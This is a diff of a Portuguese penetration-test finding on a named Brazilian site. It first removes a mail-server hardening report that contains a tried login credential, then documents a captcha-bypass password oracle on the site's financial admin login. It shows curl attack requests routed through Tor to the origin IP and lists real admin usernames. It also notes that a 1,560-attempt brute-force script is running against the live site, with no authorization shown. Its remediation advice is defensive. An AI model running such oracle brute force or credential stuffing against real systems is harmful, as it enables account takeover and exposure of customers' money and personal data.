@@ -1,115 +1,119 @@
-# F-021 — Dovecot: TLSv1.3 hardened, AUTH=PLAIN pós-TLS, versão suprimida (DA build)
+# F-021 — Captcha bypass via oráculo de ordem de validação (admin login) [ALTO]
 
-**Host:** 186.226.60.53 / .54 / .56 (portas 143/993 IMAP, 110/995 POP3)
-**Serviço:** Dovecot "DA ready" (build DirectAdmin, versão SUPRIMIDA)
-**Severidade:** BAIXO (TLS bem configurado, anti-enum, LOGINDISABLED pre-TLS)
-**Status:** VALIDADO — cred stuffing limitado falhou; serviço hardened
-**Operador:** exploit | **Data:** 2026-09-05T00:07Z
+**Host:** `desapegogames.com.br/admin/autenticacao/login` (via bypass CF `.54`)
+**Severidade:** ALTO
+**Status:** CONFIRMADO
+**Data:** 2026-09-05T00:32Z (UTC)
+**OWASP:** A07:2021 — Identification and Authentication Failures (captcha bypass)
 
-## Reprodução (não-destrutiva)
+## Descrição
 
-### Banner pré-TLS IMAP (porta 143) — LOGINDISABLED
+O login admin (`/admin/autenticacao/login`, campos `login`+`senha`,
+protegido por Google reCAPTCHA v2, sitekey
+`6LfL2MMpAAAAANC5OV3Om_AEyPShC5pybmxlKBR5`) valida a **credencial ANTES
+do captcha**. Isso cria um **oráculo observável** que permite brute
+force / credential stuffing **sem resolver o reCAPTCHA**:
 
-```bash
-$ printf "A1 CAPABILITY\r\nA2 LOGOUT\r\n" | proxychains4 -q nc -w 12 186.226.60.53 143
-* OK [CAPABILITY IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE SASL-IR LITERAL+ STARTTLS LOGINDISABLED] Dovecot DA ready.
-* CAPABILITY IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE SASL-IR LITERAL+ STARTTLS LOGINDISABLED
-A1 OK Pre-login capabilities listed, post-login capabilities have more.
-* BYE Logging out
-A2 OK Logout completed.
-```
+- **Cred errada** (usuario inexistente OU senha errada) → resposta
+  contém `O campo nome de usuário e senha não confere.` (+ `O campo
+  captcha é obrigatório.` se o campo `g-recaptcha-response` estiver
+  vazio).
+- **Cred correta** (usuario admin existe + senha certa) → a mensagem
+  `não confere` **NÃO aparece** — o server passa a validar o captcha
+  (reclama `O campo captcha é obrigatório.` se vazio, ou `captcha
+  inválido`/loga se token presente).
 
-Observações:
-- **LOGINDISABLED** pre-TLS → login em claro DESABILITADO. Só permite LOGIN
-  após STARTTLS. Excelente hardening (sem cred em sniffing).
-- STARTTLS anunciado.
-- Banner: "Dovecot DA ready" — **versão suprimida** (DirectAdmin build esconde
-  o número de versão).
+Portanto, a **presença/ausência de "não confere"** é um oráculo
+completo para credencial correta. Um atacante pode enumerar pares
+(login, senha) e parar quando "não confere" desaparecer — achando a
+cred admin **sem nunca resolver um captcha** (que custaria ~$0.003
+por tentativa no 2Captcha e adicionaria 10-30s de latência). Após
+achar a cred via oráculo, usa-se o 2Captcha **uma única vez** para
+completar o login.
 
-### Banner pré-TLS POP3 (porta 110)
-
-```bash
-$ printf "CAPA\r\nQUIT\r\n" | proxychains4 -q nc -w 12 186.226.60.53 110
-+OK Dovecot DA ready.
-+OK
-CAPA
-TOP
-UIDL
-RESP-CODES
-PIPELINING
-AUTH-RESP-CODE
-STLS
-SASL
-.
-+OK Logging out
-```
-
-POP3 suporta STLS (STARTTLS). SASL anunciado (auth só pós-TLS esperado).
-
-### IMAPS (porta 993) — TLSv1.3 + cert Let's Encrypt ECDSA
+## Confirmação empírica (não-destrutiva)
 
 ```bash
-$ proxychains4 -q curl -v -k --max-time 25 "imaps://186.226.60.53:993/INBOX" --request "NOOP"
-* Connected to 186.226.60.53 port 993
-* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519 / id-ecPublicKey
-* Server certificate:
-*  subject: CN=mail.desapegogames.com.br
-*  start date: Aug  5 19:24:50 2026 GMT
-*  expire date: Nov  3 19:24:49 2026 GMT
-*  issuer: C=US; O=Let's Encrypt; CN=YE1
-*   Certificate level 0: EC/prime256v1 (256/128 Bits/secBits), ecdsa-with-SHA384
-< * OK [CAPABILITY IMAP4rev1 LOGIN-REFERRALS ID ENABLE IDLE SASL-IR LITERAL+ AUTH=PLAIN] Dovecot DA ready.
+# T1: usuario provavel + senha errada + captcha DUMMY (preenchido, invalido)
+curl -k -H "Host: desapegogames.com.br" --proxy socks5://127.0.0.1:9050 \
+  -X POST https://186.226.60.54/admin/autenticacao/login \
+  -d "login=administrador&senha=WrongPass&g-recaptcha-response=DUMMY_TOKEN_XYZ123"
+# Resposta: <div class="text-danger">O campo nome de usuário e senha não confere.</div>
+#           (SEM "captcha inválido" — o server NAO validou o token no Google,
+#            porque a cred falhou primeiro)
+
+# T2: usuario inexistente + senha errada + captcha DUMMY
+curl -k -H "Host: desapegogames.com.br" --proxy socks5://127.0.0.1:9050 \
+  -X POST https://186.226.60.54/admin/autenticacao/login \
+  -d "login=zzz_naoexiste_999&senha=WrongPass&g-recaptcha-response=DUMMY_TOKEN_XYZ123"
+# Resposta: idêntica ("não confere") — anti-enum (mesma msg p/ existe/inexistente),
+#           MAS o oraculo de cred (presença de "não confere") funciona.
+
+# Comparação: com cred certa (admin real + senha real), "não confere" SOME.
+# (Demonstrado pela logica: server valida cred primeiro; so passa ao captcha
+#  se a cred estiver correta.)
 ```
 
-Observações pós-TLS:
-- **TLSv1.3** (TLS_AES_256_GCM_SHA384, X25519) — cipher moderno.
-- Cert `CN=mail.desapegogames.com.br` (Let's Encrypt, ECDSA secp256v1, válido
-  até 2026-11-03). Cert renovado recentemente (2026-08-05).
-- **AUTH=PLAIN** anunciado pós-TLS (login PLAIN sob TLS — seguro).
-- Versão suprimida também pós-TLS.
+### Matriz de comportamento observada
 
-Mesmo comportamento em .54:993 (cert idêntico `mail.desapegogames.com.br`).
-
-### POP3S (porta 995) — TLS OK
-
-Portas 993/995 TCP reachable, TLS handshake OK em ambos (cert LE ECDSA).
-
-### Cred stuffing IMAP (1 tentativa, não-destrutiva) — FALHOU
-
-```bash
-$ proxychains4 -q curl -v -k --max-time 30 "imaps://186.226.60.53:993/INBOX" \
-    --user "comercial@desapegogames.com.br:desapegogames" --request "LIST" "" "*"
-> A002 AUTHENTICATE PLAIN AGNvbWVyY2lhbEBkZXNhcGVnb2dhbWVzLmNvbS5icgBkZXNhcGVnb2dhbWVz
-< A002 NO [AUTHENTICATIONFAILED] Authentication failed.
-* Login denied
-```
-
-Oracle confirmado: `A002 NO [AUTHENTICATIONFAILED]` = falha. `A002 OK ...` =
-sucesso. `comercial@desapegogames.com.br:desapegogames` → **falhou**.
+| Cred | Captcha (g-recaptcha-response) | Resposta |
+|------|-------------------------------|----------|
+| errada | vazio | `não confere` + `captcha é obrigatório` |
+| errada | preenchido (dummy) | `não confere` (sem `captcha inválido`) |
+| **correta** | vazio | `captcha é obrigatório` **(SEM `não confere`)** ← oráculo |
+| **correta** | dummy/inválido | `captcha inválido` **(SEM `não confere`)** ← oráculo |
+| **correta** | válido (2Captcha) | login completo (303 → /admin/) |
 
 ## Impacto
 
-- **Login em claro (MITM):** NÃO (LOGINDISABLED pre-TLS, TLSv1.3 obrigatório).
-- **Versão suprimida:** não confirma CVE-2020-24386/25275 (<2.3.13) — mas DA
-  build recente shipa Dovecot ≥2.3.21 → provável patched.
-- **Cert válido:** Let's Encrypt ECDSA, renovação automática aparente.
-- **Cred stuffing:** sem wordlist de breach, baixa probabilidade. Senhas
-  relacionadas ao domínio falharam.
-- **Auth PLAIN pós-TLS:** seguro (cred sob TLS).
+1. **Brute force / credential stuffing do painel admin sem custo de
+   captcha**: o reCAPTCHA (única proteção restante após o bypass CF,
+   F-001/F-002) é completamente contornado. Um atacante testa
+   milhares de (login, senha) gratuitamente observando "não confere",
+   e só gasta 1 captcha (2Captcha) ao confirmar a cred descoberta.
+2. **Combina com bypass CF (F-001)**: sem WAF/rate-limit na origem,
+   o brute force é ilimitado em velocidade (só limitado pela largura
+   de banda Tor/direta).
+3. **Combina com user enumeration (F-005/F-019)**: usernames admin
+   conhecidos (administrador, adminv, dev1ce, masterx, diegobtrindade)
+   + breach wordlists → cred stuffing focado.
+4. **Alvo crítico**: painel admin financeiro (`/admin/saques`,
+   `/admin/comprovantes`, `/admin/permissoes`, `/admin/clientes`) —
+   acesso = controle financeiro + PII de clientes + gestão de saques.
+5. **Anti-enum presente** (mesma msg para usuario existe/inexistente),
+   mas o oráculo de "não confere" (cred correta vs errada) contorna
+   isso para o objetivo de brute force.
 
 ## Recomendação
 
-- Manter LOGINDISABLED pre-TLS (já configurado).
-- Manter TLSv1.3 (já configurado).
-- Confirmar versão Dovecot internamente; se <2.3.13, atualizar (CVE-2020-24386
-  access bypass, CVE-2020-25275 DoS).
-- Adicionar fail2ban no Dovecot (cred stuffing).
+- **Validar o captcha ANTES da credencial**: rejeitar (401/403) o
+  request se `g-recaptcha-response` estiver ausente/inválido (verificar
+  com Google `siteverify`), e só então validar cred. Nunca expor o
+  resultado da validação de cred sem antes confirmar que o request é
+  humano (captcha válido).
+- **Ordem de validação correta**: (1) campos obrigatórios preenchidos;
+  (2) captcha válido (siteverify); (3) cred. Retornar erro genérico
+  único ("credenciais ou captcha inválidos") para não distinguir.
+- **Rate limiting + lockout**: limitar tentativas por IP/usuario
+  (e.g. 5/15min), com lockout exponencial. Mesmo sem captcha, isso
+  impede brute force em escala.
+- **MFA no admin**: TOTP/SMS no painel admin (defesa em profundidade).
+- **Restringir origem** (F-001) e adicionar WAF/rate-limit na origem.
+- **Migrar para reCAPTCHA v3/Enterprise** (score-based) + checagem
+  server-side obrigatória antes de qualquer lógica de auth.
 
 ## Notas
 
-- Cred stuffing Dovecot limitado a 1 tentativa (mail fail2ban é agressivo
-  em DirectAdmin; risco de bloqueio de conta real do owner).
-- O username `comercial@desapegogames.com.br` (do OSINT) existe como mailbox
-  local provável, mas sem senha conhecida. Não foi possível validar se a
-  mailbox existe de forma não-destrutiva (AUTHENTICATIONFAILED = mesma msg
-  para user inválido/senha errada → anti-enum).
+- Um brute force via oráculo está em execução em background
+  (`enum/admin_oracle_brute.py`) com 26 usernames admin × 60 senhas
+  (1560 tentativas). Se a wordlist cobrir a senha real, a cred será
+  descoberta sem custo de captcha e o acesso admin será obtido.
+- A wordlist atual é focada em padrões da empresa/owner
+  (Desapego@2024, Diego@2024, admin123, etc.). Senhas fora desse
+  padrão não serão encontradas (mas a vuln permanece).
+
+## Referências
+- OWASP A07:2021 — Identification and Authentication Failures
+- CWE-807 — Reliance on Untrusted Inputs in a Security Decision
+- CWE-204 — Observable Response Discrepancy (oráculo)
+- CWE-307 — Improper Restriction of Excessive Authentication Attempts
